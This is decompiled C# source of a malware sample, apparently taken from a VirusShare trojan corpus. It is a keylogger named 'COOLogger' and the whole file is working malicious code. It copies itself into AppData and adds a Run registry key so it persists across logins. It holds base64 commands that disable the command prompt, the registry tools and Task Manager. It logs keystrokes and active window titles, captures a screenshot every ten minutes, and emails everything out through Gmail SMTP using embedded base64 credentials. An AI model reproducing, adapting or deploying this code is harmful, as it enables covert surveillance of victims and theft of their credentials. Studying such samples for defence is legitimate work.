// Decompiled with JetBrains decompiler
// Type: IzZogRyBVxDQbvJ
// Assembly: DDoSPK, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 263C75D6-BCAA-4453-AF46-8982EDDF0464
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00022-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-dfdb5ed99b682d0efb2fd6a18247e1e2b3c00c69c5a0ae0b4fa0716fd3d1ac3a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class IzZogRyBVxDQbvJ
{
  private static string wiKgfHoGrvWwICU = "aGF0YWtlYnJvQGdtYWlsLmNvbQ==";
  private static string RnKiaWiyOjXgEyc = "a2lsbGpveTMy";
  private static string eLekshNWXVaxEMp = "smtp.gmail.com";
  private static int DCSWYQpFwhPRlOT = 587;
  private static string KjyrbJMgJNblHUH;
  private static string tUqpSzRDHgHSMeb;
  private static string xUskgsKYthqOJmo;
  private static string VpuDsYhhfkIPWBN;
  private static string NcgjbzPIrZcwZdr;
  private static string cRwGHFKunuZmlCG;
  private static int NYSkTqakqmyPeln = 600000;
  private static string IdqFmEptTIFyROl = (string) null;
  private static string PTWOmCueMPjMQeo = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";
  private static string KXKwYusVDUGKjKV = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static string PheCXvnkvNbwktS = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static object hdMZyzajvYrWuNm = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string wUPsubhBJxeZZYd = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage OVcsTSiYbTrVzxf = new MailMessage();
  private static SmtpClient XDmiXrhYmwffSFf = new SmtpClient();
  [AccessedThroughProperty("QBvkFvmzKtsgStQ")]
  private static CPdLcOSrgdXpmJf _QBvkFvmzKtsgStQ;
  private static object epsIdeoxsWlFZrm;
  private static RichTextBox WyeOKyTJzOYHHtg;

  static IzZogRyBVxDQbvJ()
  {
    IzZogRyBVxDQbvJ.QBvkFvmzKtsgStQ = new CPdLcOSrgdXpmJf();
    IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm = (object) Path.GetFileName(Application.ExecutablePath);
    IzZogRyBVxDQbvJ.WyeOKyTJzOYHHtg = new RichTextBox();
  }

  private static CPdLcOSrgdXpmJf QBvkFvmzKtsgStQ
  {
    get => IzZogRyBVxDQbvJ._QBvkFvmzKtsgStQ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (IzZogRyBVxDQbvJ._QBvkFvmzKtsgStQ != null)
        CPdLcOSrgdXpmJf.KeyDown -= new CPdLcOSrgdXpmJf.KeyDownEventHandler(IzZogRyBVxDQbvJ.rumLaTDknIkoDNi);
      IzZogRyBVxDQbvJ._QBvkFvmzKtsgStQ = value;
      if (IzZogRyBVxDQbvJ._QBvkFvmzKtsgStQ == null)
        return;
      CPdLcOSrgdXpmJf.KeyDown += new CPdLcOSrgdXpmJf.KeyDownEventHandler(IzZogRyBVxDQbvJ.rumLaTDknIkoDNi);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int LdpdaUmkHqBHDPf(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    IzZogRyBVxDQbvJ.cRwGHFKunuZmlCG = Conversions.ToString(true);
    IzZogRyBVxDQbvJ.xUskgsKYthqOJmo = Conversions.ToString(false);
    IzZogRyBVxDQbvJ.VpuDsYhhfkIPWBN = Conversions.ToString(false);
    IzZogRyBVxDQbvJ.NcgjbzPIrZcwZdr = Conversions.ToString(false);
    IzZogRyBVxDQbvJ.tUqpSzRDHgHSMeb = Conversions.ToString(false);
    IzZogRyBVxDQbvJ.KjyrbJMgJNblHUH = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\VcsTSiYbTrVzxfU.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(IzZogRyBVxDQbvJ.wUPsubhBJxeZZYd + "\\VcsTSiYbTrVzxfU.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\"), IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\"), IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\"), IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\"), IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\"), IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(IzZogRyBVxDQbvJ.KjyrbJMgJNblHUH) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm), Operators.ConcatenateObject(Operators.ConcatenateObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\"), IzZogRyBVxDQbvJ.epsIdeoxsWlFZrm));
    if (Conversions.ToBoolean(IzZogRyBVxDQbvJ.tUqpSzRDHgHSMeb))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\VcsTSiYbTrVzxfU.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(IzZogRyBVxDQbvJ.xUskgsKYthqOJmo))
      Interaction.Shell(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.PTWOmCueMPjMQeo), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(IzZogRyBVxDQbvJ.VpuDsYhhfkIPWBN))
      Interaction.Shell(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.KXKwYusVDUGKjKV), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(IzZogRyBVxDQbvJ.NcgjbzPIrZcwZdr))
      Interaction.Shell(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.PheCXvnkvNbwktS), AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 600000;
    timer1.Tick += new EventHandler(IzZogRyBVxDQbvJ.cqYpbfGtrlEBXsS_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(IzZogRyBVxDQbvJ.XTfixTUdniMbuOh_Ticked);
    timer2.Start();
    IzZogRyBVxDQbvJ.QBvkFvmzKtsgStQ.EKGRVjFGQZUxOgB();
    Application.Run();
  }

  private static string gCENkSvLrxRZPup()
  {
    string lpString = new string(char.MinValue, 100);
    IzZogRyBVxDQbvJ.LdpdaUmkHqBHDPf(IzZogRyBVxDQbvJ.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string viVwSRtbseiIitn(string cooFILDbqjTBEYB) => Encoding.ASCII.GetString(Convert.FromBase64String(cooFILDbqjTBEYB));

  public static void cqYpbfGtrlEBXsS_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(IzZogRyBVxDQbvJ.cRwGHFKunuZmlCG))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = IzZogRyBVxDQbvJ.cvpfLUUTXJCJnzz(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(IzZogRyBVxDQbvJ.hdMZyzajvYrWuNm, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.wiKgfHoGrvWwICU));
        message.To.Add(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.wiKgfHoGrvWwICU));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = IzZogRyBVxDQbvJ.WyeOKyTJzOYHHtg.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.wiKgfHoGrvWwICU), IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.RnKiaWiyOjXgEyc))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        IzZogRyBVxDQbvJ.WyeOKyTJzOYHHtg.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage ovcsTsiYbTrVzxf = IzZogRyBVxDQbvJ.OVcsTSiYbTrVzxf;
      ovcsTsiYbTrVzxf.From = new MailAddress(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.wiKgfHoGrvWwICU));
      ovcsTsiYbTrVzxf.To.Add(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.wiKgfHoGrvWwICU));
      ovcsTsiYbTrVzxf.Subject = "COOLogger Logs from - " + Environment.UserName;
      ovcsTsiYbTrVzxf.Body = IzZogRyBVxDQbvJ.WyeOKyTJzOYHHtg.Text;
      SmtpClient xdmiXrhYmwffSff = IzZogRyBVxDQbvJ.XDmiXrhYmwffSFf;
      xdmiXrhYmwffSff.Host = "smtp.gmail.com";
      xdmiXrhYmwffSff.Port = 587;
      xdmiXrhYmwffSff.EnableSsl = true;
      xdmiXrhYmwffSff.Credentials = (ICredentialsByHost) new NetworkCredential(IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.wiKgfHoGrvWwICU), IzZogRyBVxDQbvJ.viVwSRtbseiIitn(IzZogRyBVxDQbvJ.RnKiaWiyOjXgEyc));
      xdmiXrhYmwffSff.Send(IzZogRyBVxDQbvJ.OVcsTSiYbTrVzxf);
      IzZogRyBVxDQbvJ.WyeOKyTJzOYHHtg.Text = "";
    }
  }

  public static void rumLaTDknIkoDNi(Keys e) => IzZogRyBVxDQbvJ.WyeOKyTJzOYHHtg.Text += IzZogRyBVxDQbvJ.QBvkFvmzKtsgStQ.UOEjssqvhahMYYn(e);

  public static void XTfixTUdniMbuOh_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(IzZogRyBVxDQbvJ.IdqFmEptTIFyROl, IzZogRyBVxDQbvJ.gCENkSvLrxRZPup(), false) == 0)
      return;
    IzZogRyBVxDQbvJ.IdqFmEptTIFyROl = IzZogRyBVxDQbvJ.gCENkSvLrxRZPup();
    if (Operators.CompareString(IzZogRyBVxDQbvJ.IdqFmEptTIFyROl, "", false) == 0)
      return;
    RichTextBox wyeOkyTjzOyhHtg = IzZogRyBVxDQbvJ.WyeOKyTJzOYHHtg;
    wyeOkyTjzOyhHtg.Text = wyeOkyTjzOyhHtg.Text + "\r\n\r\n~~~~~" + IzZogRyBVxDQbvJ.IdqFmEptTIFyROl + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string cvpfLUUTXJCJnzz(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
